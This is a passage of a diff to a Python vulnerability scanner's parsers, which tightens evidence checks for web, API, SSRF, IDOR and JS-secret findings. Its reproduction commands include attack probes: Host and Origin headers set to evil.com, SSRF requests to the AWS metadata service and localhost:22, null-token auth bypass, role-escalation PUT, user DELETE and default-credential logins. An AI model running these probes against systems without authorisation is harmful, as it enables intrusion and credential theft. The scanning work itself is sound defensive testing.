+        if _NEGATED_RESULT.search(line):
+            continue
         ll = line.lower()
         if any(x in ll for x in ['sslv2','sslv3','tlsv1.0','tlsv1.1']):
             findings.append({"type":"weak_tls","detail":line.strip(),"severity":"high",
@@ -756,12 +1260,16 @@ def parse_ssl(output):
 
 def parse_headers(output):
     findings = []
-    for sig, msg, sev in ANOMALY_SIGNATURES:
-        if re.search(sig, output, re.IGNORECASE):
-            findings.append({"type":"header_anomaly","detail":msg,"severity":sev,
-                              "path":"HTTP headers","command":"curl -sIL http://<target>"})
-    responded = re.search(r'HTTP/\S+\s+\d{3}', output)
-    if not responded:
+    for msg, sev in sig_matches(output):
+        findings.append({"type":"header_anomaly","detail":msg,"severity":sev,
+                          "path":"HTTP headers","command":"curl -sIL http://<target>"})
+    # curl -sIL prints the header block of every hop; the LAST HTTP/ line is
+    # the terminal response. Missing security headers are only a real finding
+    # against a terminal 2xx/4xx/5xx — a redirect-only host (every hop a 3xx)
+    # says nothing about the resource's final headers, so don't claim a
+    # "missing CSP/HSTS" weakness off a bare 301.
+    statuses = re.findall(r'HTTP/\S+\s+(\d{3})', output)
+    if not statuses or not any(s not in REDIRECT_CODES for s in statuses):
         return findings
     missing = []
     if 'Content-Security-Policy' not in output: missing.append('CSP')
@@ -801,23 +1309,58 @@ def parse_snmp(output):
 
 def parse_dirb(output):
     findings = []
+    ansi_re = re.compile(r'\x1b\[[0-9;]*[mGKHF]')
     for line in output.splitlines():
         m = re.search(r'(https?://\S+)\s+\(CODE:(\d+)', line)
         if m:
             code, url = m.group(2), m.group(1)
-            sev = ("critical" if any(x in url.lower() for x in ['.git','admin','.env','backup','config','passwd'])
-                   else "medium" if code in ('200','201') else "low")
+            if code in REDIRECT_CODES or code not in ('200', '201', '204', '401', '403'):
+                continue
             path = re.sub(r'https?://[^/]+', '', url)
-            findings.append({"type":"web_path","detail":f"HTTP {code} {url}","severity":sev,
-                              "path":path,"command":f"curl -sk {url}"})
+            # Status-only content discovery is recon, never a vuln claim: a
+            # catch-all router returns 200 for anything. Body verification is
+            # the job of the dedicated .env/.git/etc probes.
+            findings.append({"type": "web_path", "detail": f"HTTP {code} {url}",
+                             "severity": "info", "path": path,
+                             "command": f"curl -skL {url}"})
+            continue
+        # gobuster: index.html (Status: 200) [Size: 1234]
+        g = re.search(r'(/?\S+)\s+\(Status:\s*(\d+)\)', line)
+        if g:
+            code, path = g.group(2), g.group(1).rstrip('/')
+            if not path.startswith('/'):
+                path = '/' + path
+            if code in REDIRECT_CODES or code not in ('200', '201', '204', '401', '403'):
+                continue
+            findings.append({"type": "web_path", "detail": f"HTTP {code} http://<target>{path} (gobuster)",
+                             "severity": "info", "path": path,
+                             "command": f"curl -skL http://<target>{path}"})
+            continue
+        # ffuf (2.x writes path-only lines, ANSI-prefixed, with progress glued on \r):
+        #   '\x1b[2K.bash_history   [Status: 200, Size: 41, Words: 3, ...]'
+        # older builds print the full URL instead. Split per \r segment so a
+        # progress line can never be mistaken for a result.
+        for seg in re.split(r'\r', ansi_re.sub('', line)):
+            f = re.match(r'\s*(https?://\S+?|\S+)\s+\[Status:\s*(\d+)[,\]]', seg)
+            if not f:
+                continue
+            url, code = f.group(1), f.group(2)
+            if code in REDIRECT_CODES or code not in ('200', '201', '204', '401', '403'):
+                continue
+            if url.startswith('http'):
+                path = re.sub(r'https?://[^/]+', '', url)
+            else:
+                path = url if url.startswith('/') else '/' + url
+            findings.append({"type": "web_path", "detail": f"HTTP {code} http://<target>{path} (ffuf)",
+                             "severity": "info", "path": path,
+                             "command": f"curl -skL http://<target>{path}"})
     return findings
 
 def parse_banner_anomaly(output):
     findings = []
-    for sig, msg, sev in ANOMALY_SIGNATURES:
-        if re.search(sig, output, re.IGNORECASE):
-            findings.append({"type":"banner_anomaly","detail":msg,"severity":sev,
-                              "path":"service banner","command":"nmap --script=banner -p <ports> <target>"})
+    for msg, sev in sig_matches(output):
+        findings.append({"type":"banner_anomaly","detail":msg,"severity":sev,
+                          "path":"service banner","command":"nmap --script=banner -p <ports> <target>"})
     for line in output.splitlines():
         port_m = re.match(r'(\d+)/tcp\s+open\s+\S+\s+(.*)', line)
         if port_m:
@@ -868,15 +1411,25 @@ def parse_http_anomaly(output):
         findings.append({"type":"host_header_injection","severity":"high","path":"Host header",
             "detail":"Host header value reflected in redirect — SSRF/cache poisoning",
             "command":"curl -skI -H 'Host: evil.com' 'http://<target>/'"})
-    for pattern, msg, sev in [
-        (r'admin.*200|/admin.*200', "Admin panel accessible (HTTP 200)", "critical"),
-        (r'\.git.*200', ".git directory exposed (HTTP 200)", "critical"),
-        (r'\.env.*200', ".env file exposed (HTTP 200)", "critical"),
-    ]:
-        if re.search(pattern, output, re.I):
-            path = re.search(r'(\.git|\.env|admin)', pattern).group(1) if re.search(r'(\.git|\.env|admin)', pattern) else "/"
-            findings.append({"type":"exposed_path","detail":msg,"severity":sev,
-                "path":f"/{path}","command":f"curl -sk 'http://<target>/{path}'"})
+    # .git / .env / admin — status alone proves nothing (catch-all routers 200
+    # anything); findings require the probe body to actually BE the artifact.
+    m = re.search(r'body:\.git\[(\d+)\] (.*)', output)
+    if m and m.group(1) not in REDIRECT_CODES and m.group(1) in ('200', '201', '204') and \
+       re.search(r'\[(core|remote|branch|user)\]|repositoryformatversion|refs/heads|packed-refs', m.group(2), re.I):
+        findings.append({"type":"git_exposed","severity":"critical","path":"/.git/config",
+            "detail":".git/config exposed — source/configuration disclosure",
+            "command":"curl -skL 'http://<target>/.git/config'"})
+    m = re.search(r'body:\.env\[(\d+)\] (.*)', output)
+    if m and m.group(1) not in REDIRECT_CODES and m.group(1) in ('200', '201', '204') and \
+       re.search(r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}', m.group(2)):
+        findings.append({"type":"env_exposed","severity":"critical","path":"/.env",
+            "detail":".env file exposed — credentials, API keys at risk",
+            "command":"curl -skL 'http://<target>/.env'"})
+    m = re.search(r'body:admin\[(\d+)\] (.*)', output)
+    if m and m.group(1) not in REDIRECT_CODES and m.group(1) in ('200', '201', '204'):
+        findings.append({"type":"admin_panel","severity":"info","path":"/admin",
+            "detail":"Admin interface reachable (HTTP 200) — access control must be verified separately",
+            "command":"curl -skL 'http://<target>/admin'"})
     return findings
 
 def parse_timing(output):
@@ -909,12 +1462,20 @@ def parse_timing(output):
 
 def parse_auth_probe(output):
     findings = []
-    for cred in ['admin:admin=200','admin:password=200','root:root=200']:
-        if cred in output:
-            pair = cred.replace('=200','')
-            findings.append({"type":"default_cred_http","severity":"critical","path":"/ (HTTP Basic Auth)",
-                "detail":f"HTTP Basic Auth accepted default credential: {pair}",
-                "command":f"curl -sku {pair} http://<target>/"})
+    # Unauthenticated baseline: a homepage that returns 200 to everyone (e.g.
+    # catch-all) means a "200 with admin:admin" is NOT proof the credential was
+    # accepted — only report default HTTP creds when auth is actually enforced.
+    anon = re.search(r'anon=(\d{3})', output)
+    anon_code = anon.group(1) if anon else None
+    enforced = bool(anon_code) and anon_code not in REDIRECT_CODES and anon_code not in ('000', '200', '201', '204')
+    if enforced:
+        for cred in ['admin:admin=200', 'admin:password=200', 'root:root=200']:
+            if cred in output:
+                pair = cred.replace('=200', '')
+                findings.append({"type": "default_cred_http", "severity": "critical",
+                    "path": "/ (HTTP Basic Auth)",
+                    "detail": f"HTTP Basic Auth accepted default credential: {pair}",
+                    "command": f"curl -sku {pair} http://<target>/"})
     if re.search(r'ftp.*230|230.*logged', output, re.I):
         findings.append({"type":"ftp_anon","severity":"high","path":"FTP :21",
             "detail":"FTP anonymous login accepted",
@@ -943,8 +1504,12 @@ def parse_nse_deep(output):
         (r'smtp.*open relay|relay.*accepted', "SMTP open relay confirmed", "critical", "SMTP :25", "nmap --script=smtp-open-relay -p 25 <target>"),
         (r'ldap.*rootDSE|namingContexts', "LDAP anonymous bind", "medium", "LDAP :389", "nmap --script=ldap-rootdse -p 389 <target>"),
         (r'ftp-anon.*Login with password', "FTP anonymous read/write", "high", "FTP :21", "nmap --script=ftp-anon -p 21 <target>"),
-        (r'redis_version|redis.*server', "Redis accessible without auth", "critical", "Redis :6379", "redis-cli -h <target> ping"),
-        (r'mongodb.*databases|totalSize', "MongoDB accessible without auth", "critical", "MongoDB :27017", "nmap --script=mongodb-info -p 27017 <target>"),
+        # redis_version must be a REAL version string — "Redis server not
+        # running" must never become "Redis accessible without auth".
+        (r'redis_version\s*[:=]\s*\d', "Redis accessible without auth", "critical", "Redis :6379", "redis-cli -h <target> ping"),
+        # Positive MongoDB data evidence only — "db with 0 databases" (closed
+        # port) is NOT an access finding.
+        (r'totalSize|\bb*db\b.*with [1-9]|databases:\s*[1-9]|total\s+size\s*[1-9]', "MongoDB accessible without auth", "critical", "MongoDB :27017", "nmap --script=mongodb-info -p 27017 <target>"),
     ]
     for pattern, msg, sev, path, cmd in checks:
         if re.search(pattern, output, re.I):
@@ -963,6 +1528,8 @@ def parse_hydra(output):
 def parse_msf(output):
     findings = []
     for line in output.splitlines():
+        if _NEGATED_RESULT.search(line):
+            continue
         if 'vulnerable' in line.lower() or re.search(r'CVE-\d{4}-\d+', line):
             findings.append({"type":"msf_finding","detail":line.strip(),"severity":"high",
                 "path":"service","command":"msfconsole -q"})
@@ -985,6 +1552,8 @@ def parse_generic(output):
         if re.match(r'^(error|warn|info|fatal|debug)\s*:', ll):
             continue
         if re.match(r'^\w[\w\- ]*:', stripped):
+            continue
+        if re.match(r'^(?:\[\*\]\s*)?no\s+[\w\s-]{0,40}found\.?\s*$', stripped, re.I):
             continue
         if any(k in ll for k in keywords):
             findings.append({"type":"generic","detail":stripped,"severity":"info",
@@ -1018,6 +1587,34 @@ def parse_waf(output):
 # ─────────────────────────────────────────────────────────────────────────────
 # NEW PARSERS — API & DATABASE
 # ─────────────────────────────────────────────────────────────────────────────
+def _api_evidence(path, code, body):
+    """Body-evidence gate for discovery probes: a code alone proves nothing
+    (catch-all routers 200 anything). Sensitive/spec paths only become
+    findings when the returned content is actually the artifact they name."""
+    if code in REDIRECT_CODES:
+        return False
+    if any(k in path for k in ('openapi', 'swagger', 'api-docs', 'api_docs')):
+        return bool(body) and any(m in body for m in (
+            '"openapi"', '"swagger"', '"paths"', '"components"',
+            '"definitions"', '"info"', 'swagger-ui'))
+    if 'actuator/env' in path:
+        return bool(body) and any(m in body for m in (
+            '"propertySources"', '"activeProfiles"', '"systemEnvironment"', '"env"'))
+    if '/actuator' in path:
+        return bool(body) and any(m in body for m in (
+            '"status"', '"beans"', '"mappings"', '"configprops"', '"heapdump"',
+            '"caches"', '"loggers"', '"metrics"', '"threaddump"'))
+    if path == '/graphql':
+        return bool(body) and any(m in body for m in (
+            '"queryType"', '"__schema"', '"types"', '"data"', 'graphql'))
+    if path == '/metrics':
+        return bool(body) and any(m in body for m in (
+            'jvm_', 'process_', 'http_server_', 'prometheus', '_samples'))
+    if path == '/health':
+        return bool(body) and '"status"' in body
+    return True
+
+
 def parse_api_discovery(output):
     findings = []
     sensitive = {'/swagger':'/swagger — API docs exposed (schema disclosure)','swagger.json':'swagger.json — full API schema accessible',
@@ -1028,21 +1625,34 @@ def parse_api_discovery(output):
                  '/health':'/health endpoint (may disclose internal state)'}
     sensitive_keys = sorted(sensitive, key=len, reverse=True)
     for line in output.splitlines():
-        m = re.match(r'(/[^\s:]+):\s*(\d+)', line)
-        if m:
-            path, code = m.group(1), m.group(2)
-            if code in ('200','201','301','302','401','403'):
-                sev = ('critical' if any(s in path for s in ['.env','git','backup','config']) else
-                       'high' if any(s in path for s in ['swagger','openapi','api-docs','actuator','graphql','metrics']) else
-                       'medium' if code == '200' else 'info')
-                desc = next((sensitive[k] for k in sensitive_keys if path.startswith(k)),
-                            f"API endpoint {path} returns HTTP {code}")
-                findings.append({"type":"api_endpoint","detail":desc,"severity":sev,
-                    "path":path,"command":f"curl -sk http://<target>{path}"})
+        m = re.match(r'(/[^\s|]+):(\d{3})\|(.*)', line)
+        if not m:
+            continue
+        path, code, body = m.group(1), m.group(2), m.group(3)
+        if code in REDIRECT_CODES:                      # 3xx proves nothing
+            continue
+        if code not in ('200', '201', '204', '401', '403', '405', '500'):
+            continue
+        if not _api_evidence(path, code, body):
+            continue
+        if 'actuator/env' in path and code in ('200', '201', '204'):
+            sev = 'critical'
+        elif any(s in path for s in ('swagger', 'openapi', 'api-docs', 'graphql')):
+            sev = 'high'
+        elif '/actuator' in path:
+            sev = 'medium'
+        else:
+            sev = 'info'                                # mapping recon, not a vuln
+        desc = next((sensitive[k] for k in sensitive_keys if path.startswith(k)),
+                    (f"API endpoint {path} requires authentication (HTTP {code})" if code in ('401', '403') else
+                     f"API endpoint {path} responds (HTTP {code})"))
+        findings.append({"type": "api_endpoint", "detail": desc, "severity": sev,
+                         "path": path, "command": f"curl -skL http://<target>{path}"})
     if '__schema' in output and 'types' in output:
-        findings.append({"type":"graphql_introspection","severity":"high",
-            "detail":"GraphQL introspection enabled — full schema disclosed","path":"/graphql",
-            "command":"curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'  http://<target>/graphql"})
+        findings.append({"type": "graphql_introspection", "severity": "high",
+            "detail": "GraphQL introspection enabled — full schema disclosed",
+            "path": "/graphql",
+            "command": "curl -X POST -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'  http://<target>/graphql"})
     return findings
 
 def parse_api_bola(output):
@@ -1051,19 +1661,26 @@ def parse_api_bola(output):
     for i, line in enumerate(lines):
         if '=== id=' in line:
             id_m = re.search(r'id=(\S+)', line)
-            if not id_m: continue
+            if not id_m:
+                continue
             obj_id = id_m.group(1)
             block = '\n'.join(lines[i:i+10])
-            if re.search(r'\{.*"(id|user|email|name|account|data)"', block, re.I):
-                findings.append({"type":"bola_idor","severity":"critical",
-                    "detail":f"BOLA/IDOR: unauthenticated data returned for id={obj_id} — object-level auth missing",
-                    "path":f"/api/v1/users/{obj_id}",
-                    "command":f"curl -sk 'http://<target>/api/v1/users/{obj_id}'"})
-            if re.search(r'"(password|secret|token|ssn|credit|card|hash)"', block, re.I):
-                findings.append({"type":"sensitive_data_exposure","severity":"critical",
-                    "detail":f"Sensitive fields exposed via IDOR (id={obj_id})",
-                    "path":f"/api/v1/users/{obj_id}",
-                    "command":f"curl -sk 'http://<target>/api/v1/users/{obj_id}'"})
+            # IDOR evidence: the queried object id is echoed back, or the
+            # response carries a concrete user identity (email/username) — a
+            # bare JSON wrapper or catch-all page is not data disclosure.
+            id_echo = re.escape(obj_id)
+            if (re.search(r'"id"\s*:\s*["\']?' + id_echo + r'["\']?(?:\s*[,}])', block, re.I) or
+                    re.search(r'"email"\s*:\s*"[^"]*@[^"]+"', block, re.I) or
+                    re.search(r'"username"\s*:\s*"[^"]{2,}"|"name"\s*:\s*"[^"]{2,}"', block, re.I)):
+                findings.append({"type": "bola_idor", "severity": "critical",
+                    "detail": f"BOLA/IDOR: unauthenticated data returned for id={obj_id} — object-level auth missing",
+                    "path": f"/api/v1/users/{obj_id}",
+                    "command": f"curl -sk 'http://<target>/api/v1/users/{obj_id}'"})
+            if re.search(r'"(password|secret|token|ssn|credit|card|hash|api_key|access_key)"\s*:\s*"?[^"]{3,}"?', block, re.I):
+                findings.append({"type": "sensitive_data_exposure", "severity": "critical",
+                    "detail": f"Sensitive fields exposed via IDOR (id={obj_id})",
+                    "path": f"/api/v1/users/{obj_id}",
+                    "command": f"curl -sk 'http://<target>/api/v1/users/{obj_id}'"})
     return findings
 
 def parse_api_auth(output):
@@ -1074,21 +1691,28 @@ def parse_api_auth(output):
         ('null_token: 200', "Null Bearer token accepted — auth bypass", "critical", "/api/v1/users",
          "curl -H 'Authorization: Bearer null' http://<target>/api/v1/users"),
     ]
-    for marker, msg, sev, path, cmd in checks:
-        if marker in output:
-            findings.append({"type":"broken_auth","detail":msg,"severity":sev,"path":path,"command":cmd})
-    for line in output.splitlines():
-        m = re.match(r'(\S+):\s*(200)', line)
-        if m and m.group(1) not in ('valid_user','invalid_user','jwt_none','null_token'):
-            label = m.group(1).rstrip(':')
-            findings.append({"type":"unauth_endpoint","severity":"high",
-                "detail":f"API endpoint accessible without auth: {label} → HTTP 200",
-                "path":f"/api/v1/{label}",
-                "command":f"curl -sk http://<target>/api/v1/{label}"})
-    if re.search(r'"(email|username|user_id|role|is_admin)".*:.*', output):
-        findings.append({"type":"data_exposure_no_auth","severity":"high",
-            "detail":"Authenticated user fields returned without auth token",
-            "path":"/api/v1/profile","command":"curl -sk http://<target>/api/v1/profile"})
+    # Baseline: the unauthenticated admin call. If it already returns 200 there
+    # is no auth to bypass — a "JWT none bypass" claim would be a hallucination.
+    anon = re.search(r'anon:(\d{3})\|', output)
+    anon_code = anon.group(1) if anon else None
+    if anon_code and anon_code not in REDIRECT_CODES and anon_code != '000':
+        if anon_code in ('200', '201', '204'):
+            findings.append({"type": "unauth_endpoint", "severity": "high",
+                "detail": "No authentication enforced — /api/v1/admin returns HTTP 200 without credentials",
+                "path": "/api/v1/admin",
+                "command": "curl -sk http://<target>/api/v1/admin"})
+        else:
+            for marker, msg, sev, path, cmd in checks:
+                if marker in output:
+                    findings.append({"type": "broken_auth", "detail": msg, "severity": sev,
+                        "path": path, "command": cmd})
+            for line in output.splitlines():
+                m = re.match(r'(users|config):\s*(200)', line)
+                if m:
+                    findings.append({"type": "unauth_endpoint", "severity": "high",
+                        "detail": f"API endpoint accessible without auth: {m.group(1)} → HTTP 200",
+                        "path": f"/api/v1/{m.group(1)}",
+                        "command": f"curl -sk http://<target>/api/v1/{m.group(1)}"})
     return findings
 
 def parse_api_injection(output):
@@ -1100,7 +1724,7 @@ def parse_api_injection(output):
          "PHP DB warning in API — SQL injection / verbose errors", "critical", "sqli"),
         (r"\{.*\$gt|operator.*\$ne|\$regex.*matched",
          "NoSQL operator reflected in response — NoSQL injection", "critical", "nosqli"),
-        (r"49|7\*7=49|\{\{7\*7\}\}.*49",
+        (r"SSTI_RESULT:[^\n]*\b49\b|\{\{7\*7\}\}.*\b49\b",
          "SSTI confirmed: 7*7=49 in response — Server-Side Template Injection", "critical", "ssti"),
         (r"Traceback|stack trace|at.*\(.*\)\s*$|Exception in thread",
          "Stack trace / exception in API response — code disclosure", "high", "error_disclosure"),
@@ -1114,20 +1738,28 @@ def parse_api_injection(output):
 
 def parse_api_ssrf(output):
     findings = []
-    lines = output.splitlines()
-    for line in lines:
-        m = re.match(r'(\w+)=AWS_IMDS:\s*(\d+)', line)
-        if m and m.group(2) in ('200','301','302'):
-            findings.append({"type":"ssrf","severity":"critical",
-                "detail":f"SSRF via '{m.group(1)}' parameter — AWS IMDS accessible (HTTP {m.group(2)})",
-                "path":f"/api/v1/fetch?{m.group(1)}=http://169.254.169.254/",
-                "command":f"curl -sk 'http://<target>/api/v1/fetch?{m.group(1)}=http://169.254.169.254/latest/meta-data/'"})
-        m2 = re.match(r'(\w+)=localhost:22:\s*(\d+)', line)
-        if m2 and m2.group(2) not in ('000','0','400','404','403'):
-            findings.append({"type":"ssrf","severity":"high",
-                "detail":f"SSRF via '{m2.group(1)}' — internal service :22 probe returned HTTP {m2.group(2)}",
-                "path":f"/api/v1/proxy?{m2.group(1)}=http://127.0.0.1:22",
-                "command":f"curl -sk 'http://<target>/api/v1/proxy?{m2.group(1)}=http://127.0.0.1:22'"})
+    imds_markers = re.compile(r'ami-id|instance-id|security-credentials|latest/meta-data|dynamic|local-ipv4|mac\b', re.I)
+    for line in output.splitlines():
+        m = re.match(r'(\w+)=baseline:(\d+)\|imds:(\d+)\|(.*?)\|local22:(\d+)$', line)
+        if not m:
+            continue
+        param, base, imds, ibody, local = m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
+        # IMDS SSRF: an HTTP 200 alone can be a catch-all; the response must
+        # actually contain AWS IMDS metadata for a firm finding. 3xx proves
+        # nothing.
+        if imds not in REDIRECT_CODES and imds in ('200', '201', '202', '204') and \
+           imds != base and imds_markers.search(ibody):
+            findings.append({"type": "ssrf", "severity": "critical",
+                "detail": f"SSRF via '{param}' parameter — AWS IMDS metadata returned (HTTP {imds})",
+                "path": f"/api/v1/fetch?{param}=http://169.254.169.254/",
+                "command": f"curl -skL 'http://<target>/api/v1/fetch?{param}=http://169.254.169.254/latest/meta-data/'"})
+        # localhost:22 SSRF: the probe must CHANGE the response relative to the
+        # inert baseline (catch-all apps return the same code for any param).
+        if local not in REDIRECT_CODES and local not in ('000', '') and local != base:
+            findings.append({"type": "ssrf", "severity": "high",
+                "detail": f"SSRF via '{param}' — internal network probe altered the response ({base} → {local})",
+                "path": f"/api/v1/proxy?{param}=http://127.0.0.1:22",
+                "command": f"curl -skL 'http://<target>/api/v1/proxy?{param}=http://127.0.0.1:22'"})
     if re.search(r'root:.*:/bin/', output):
         findings.append({"type":"ssrf_lfi","severity":"critical",
             "detail":"SSRF + file:// scheme confirmed — /etc/passwd retrieved",
@@ -1137,29 +1769,41 @@ def parse_api_ssrf(output):
 
 def parse_api_mass_assign(output):
     findings = []
-    if re.search(r'"role".*"admin"|"is_admin".*true|"admin".*true|"privilege".*"admin"', output, re.I):
+    # Mass assignment requires the response to be a stored resource (an id in
+    # the same output) carrying the elevated field — request-body echo alone is
+    # not proof the field was accepted.
+    entity_id = re.search(r'"?\s*"id"\s*:\s*', output)
+    if entity_id and re.search(r'"role"\s*:\s*"admin"|"is_admin"\s*:\s*true|"admin"\s*:\s*true|"privilege"\s*:\s*"admin"', output, re.I):
         findings.append({"type":"mass_assignment","severity":"critical",
             "detail":"Mass assignment: admin role field accepted in API body",
             "path":"/api/v1/users/1 (PUT/PATCH body)",
             "command":"curl -X PUT -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' http://<target>/api/v1/users/1"})
-    if re.search(r'"credits".*\d{4,}|"balance".*\d{4,}', output, re.I):
+    if entity_id and re.search(r'"credits"\s*:\s*\d{4,}|"balance"\s*:\s*\d{4,}', output, re.I):
         findings.append({"type":"mass_assignment","severity":"high",
             "detail":"Mass assignment: numeric privilege field accepted (credits/balance manipulation)",
             "path":"/api/v1/profile (PATCH body)",
             "command":"curl -X PATCH -H 'Content-Type: application/json' -d '{\"credits\":99999}' http://<target>/api/v1/profile"})
-    delete_m = re.search(r'DELETE user:\s*(\d+)', output)
-    if delete_m and delete_m.group(1) in ('200','204'):
+    # Function-level access: an arbitrary bare 200 is not proof — the
+    # unauthenticated admin endpoint must return real JSON data (>=2 members,
+    # which catch-all HTML / single-key error wrappers don't).
+    def _json_data(body):
+        return body and len(re.findall(r'"[A-Za-z_][A-Za-z0-9_]{1,}"\s*:', body)) >= 2
+    unauth_proven = False
+    for line in output.splitlines():
+        m = re.match(r'(admin/users|internal/debug):(\d{3})\|(.*)', line)
+        if m and m.group(2) not in REDIRECT_CODES and m.group(2) in ('200', '201', '202', '204') and _json_data(m.group(3)):
+            unauth_proven = True
+            findings.append({"type":"broken_function_auth","severity":"critical",
+                "detail":f"Admin endpoint accessible without auth: /{m.group(1)} → HTTP {m.group(2)} (JSON data returned)",
+                "path":f"/api/v1/{m.group(1)}",
+                "command":f"curl -skL http://<target>/api/v1/{m.group(1)}"})
+    # DELETE corroboration only counts once unauth access was already proven.
+    delete_m = re.search(r'DELETE user:(\d{3})\|', output)
+    if delete_m and unauth_proven and delete_m.group(1) in ('200', '204'):
         findings.append({"type":"broken_function_auth","severity":"critical",
-            "detail":f"Broken Function Level Auth: DELETE /api/v1/users/1 returned HTTP {delete_m.group(1)}",
+            "detail":f"Broken Function Level Auth: DELETE /api/v1/users/1 returned HTTP {delete_m.group(1)} without authentication",
             "path":"/api/v1/users/1 (DELETE)",
             "command":"curl -X DELETE http://<target>/api/v1/users/1"})
-    for line in output.splitlines():
-        m = re.match(r'(admin/users|internal/debug):\s*(\d+)', line)
-        if m and m.group(2) in ('200','201'):
-            findings.append({"type":"broken_function_auth","severity":"critical",
-                "detail":f"Admin endpoint accessible: /{m.group(1)} → HTTP {m.group(2)}",
-                "path":f"/api/v1/{m.group(1)}",
-                "command":f"curl -sk http://<target>/api/v1/{m.group(1)}"})
     return findings
 
 def parse_api_misc(output):
@@ -1169,12 +1813,12 @@ def parse_api_misc(output):
             "detail":"API CORS wildcard — any origin can read API responses",
             "path":"/api/v1 (CORS headers)",
             "command":"curl -H 'Origin: https://evil.com' -I http://<target>/api/v1/users"})
-    responses = [r for r in re.findall(r'\b(\d{3})\b', output[:500]) if r != '000']
+    responses = [r for r in re.findall(r'\b(\d{3})\b', output[:500]) if r != '000' and r not in REDIRECT_CODES]
     total = len(responses)
     non_429 = [r for r in responses if r != '429']
-    if total >= 10 and len(non_429) >= 9:
+    if total >= 10 and len(non_429) == total:
         findings.append({"type":"missing_rate_limit","severity":"medium",
-            "detail":"No rate limiting detected — 15 requests returned without 429/throttle",
+            "detail":f"No rate limiting detected — {total} requests returned without any 429/throttle",
             "path":"/api/v1/login (rate limit test)",
             "command":"for i in $(seq 1 50); do curl -s -o /dev/null -w '%{http_code}' http://<target>/api/v1/login; done"})
     if re.search(r'api_key|secret_key|aws_secret|stripe_key|twilio|sendgrid', output, re.I):
@@ -1450,6 +2094,272 @@ def parse_nuclei(output):
                     "command":"nuclei -u http://<target> -severity " + sev})
     return findings
 
+def parse_subdomains(output, sess):
+    """Only pre-validated resolvable subdomains become findings — crt.sh /
+    dnsrecon candidate lines are printed but never emitted (no resolution
+    proof). Everything here is informational."""
+    findings = []
+    seen = set()
+    target = str(sess.get('target', ''))
+    tgt = re.escape(target) if target else r'[a-z0-9.-]+'
+    for line in output.splitlines():
+        m = re.search(r'(?i)([a-z0-9_-]+\.' + tgt + r')\s*->\s*([0-9.]+)', line)
+        if m:
+            name, ip = m.group(1), m.group(2)
+            if name in seen: continue
+            seen.add(name)
+            findings.append({"type": "subdomain", "severity": "info",
+                "detail": f"Resolved subdomain: {name} -> {ip}",
+                "path": name, "command": f"dig +short {name} A"})
+            continue
+        m = re.search(r'\[\+\]\s+A\s+([a-z0-9_.-]+\.' + tgt + r')\s+([0-9.]+)', line, re.I)
+        if m:
+            name, ip = m.group(1), m.group(2)
+            if name in seen: continue
+            seen.add(name)
+            findings.append({"type": "subdomain", "severity": "info",
+                "detail": f"dnsrecon A record: {name} -> {ip}",
+                "path": name, "command": f"dig +short {name} A"})
+    return findings
+
+def parse_breach_osint(output, sess):
+    """Breach findings require a real HIBP 200 breach response (COMPROMISED:).
+    Discovered emails are informational; NO_BREACH lines show the lookup ran
+    and returned clean, which is itself worth recording."""
+    findings = []
+    target = str(sess.get('target', ''))
+    emails = set()
+    for line in output.splitlines():
+        s = line.strip()
+        if s.startswith('COMPROMISED:'):
+            rest = s.split(':', 1)[1]
+            email, _, breaches = rest.partition('|')
+            if email:
+                findings.append({"type": "breach_exposure", "severity": "critical",
+                    "path": email,
+                    "detail": f"Email {email} appears in breaches (HIBP v3): {breaches[:120]}",
+                    "command": "PWM_HIBP_KEY set — haveibeenpwned breachedaccount lookup"})
+        elif s.startswith('NO_BREACH:'):
+            email = s.split(':', 1)[1]
+            if email:
+                findings.append({"type": "no_breach", "severity": "info",
+                    "path": email,
+                    "detail": f"HIBP check ran for {email} — no breach found",
+                    "command": "haveibeenpwned breachedaccount lookup"})
+        elif re.search(r'[a-z0-9._%+-]+@[a-z0-9.-]+', s):
+            em = re.match(r'[a-z0-9._%+-]+@[a-z0-9.-]+', s)
+            if em:
+                emails.add(em.group(0))
+    if target and target.replace('.', '').isalnum() and len(emails) <= 200:
+        for em in sorted(emails)[:40]:
+            domain = em.split('@', 1)[1] if '@' in em else ''
+            if domain and (domain.endswith(target) or domain.endswith('.' + target)):
+                findings.append({"type": "email_discovered", "severity": "info",
+                    "path": em, "detail": f"Employee email discovered via theHarvester: {em}",
+                    "command": "theHarvester -d <target> -b all"})
+    return findings
+
+def _js_bundle_url(src, target):
+    """Real URL of a JS bundle reference as written in the page."""
+    if src.startswith('http://') or src.startswith('https://'):
+        return src
+    if src.startswith('/'):
+        return f'http://{target}{src}'
+    return f'http://{target}/{src}'
+
+
+def parse_js_leak(output, sess):
+    """High findings only for real secret-format matches (SECRET:<kind>:<value>);
+    endpoints and sourcemaps are informational. Paths and commands reference
+    the real bundle URLs the scan fetched — never placeholder text."""
+    findings = []
+    seen_secrets = set()
+    seen_eps = set()
+    srcs = []
+    section = ''
+    target = (sess or {}).get('target', '')
+    for line in output.splitlines():
+        s = line.strip()
+        if s.startswith('=====') and s.endswith('====='):
+            section = s.strip('=')
+            continue
+        if not s:
+            continue
+        if section == 'JS-SRC-LIST':
+            srcs.append(s)
+            continue
+        if s.startswith('SECRET:'):
+            _, kind, value = s.split(':', 2)
+            key = (kind, value[:40])
+            if key in seen_secrets: continue
+            seen_secrets.add(key)
+            js_url = _js_bundle_url(srcs[0], target) if srcs else ''
+            findings.append({"type": "js_secret_leak", "severity": "high",
+                "path": re.sub(r'^https?://[^/]+', '', js_url) if js_url else '-',
+                "detail": f"Possible {kind} secret in JS bundle"
+                          + (f" ({js_url})" if js_url else "") + f": {value[:70]}",
+                "command": f"curl -sk {js_url}" if js_url else ""})
+            continue
+        if s.startswith('MAP:'):
+            u = s.split(':', 1)[1]
+            findings.append({"type": "sourcemap_exposed", "severity": "info",
+                "path": re.sub(r'^https?://[^/]+', '', u) or '/',
+                "detail": f"Sourcemap file reachable — original source may be recoverable: {u}",
+                "command": f"curl -sk {u}"})
+            continue
+        if section != 'JS-ENDPOINTS':
+            continue
+        if len(seen_eps) >= 30: continue
+        ep = re.match(r'^((?:/|https?://)[^ ]+)$', s)
+        if ep and ('/api/' in s or '/v1/' in s or '/v2/' in s or '/graphql' in s or '/rest' in s):
+            if s in seen_eps: continue
+            seen_eps.add(s)
+            js_url = _js_bundle_url(srcs[0], target) if srcs else ''
